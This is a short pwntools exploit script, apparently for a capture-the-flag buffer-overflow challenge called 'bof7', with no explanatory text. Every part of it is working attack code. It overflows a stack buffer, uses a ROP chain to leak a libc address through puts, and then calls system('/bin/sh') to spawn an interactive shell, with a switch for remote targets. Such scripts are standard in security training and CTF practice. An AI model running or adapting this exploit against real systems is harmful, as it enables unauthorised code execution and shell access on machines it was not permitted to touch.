#!/usr/bin/env python3

from pwn import *

exe = ELF('bof7', checksec=False)
libc = exe.libc
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
# GDB()

### LEAK LIBC ###
offset = 88
pop_rdi = 0x0000000000401263

payload  = b'A' * offset + p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts)
payload += p64(exe.sym.main)
sla(b'\n', payload)

libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info("Leak libc: " + hex(libc_leak))
libc.address = libc_leak - libc.sym.puts
log.info("Libc base: " + hex(libc.address))

### GET SHELL ###
payload  = b'A' * offset + p64(pop_rdi)
payload += p64( next(libc.search('/bin/sh'))) + p64(libc.sym.system)
sl(payload)

p.interactive()
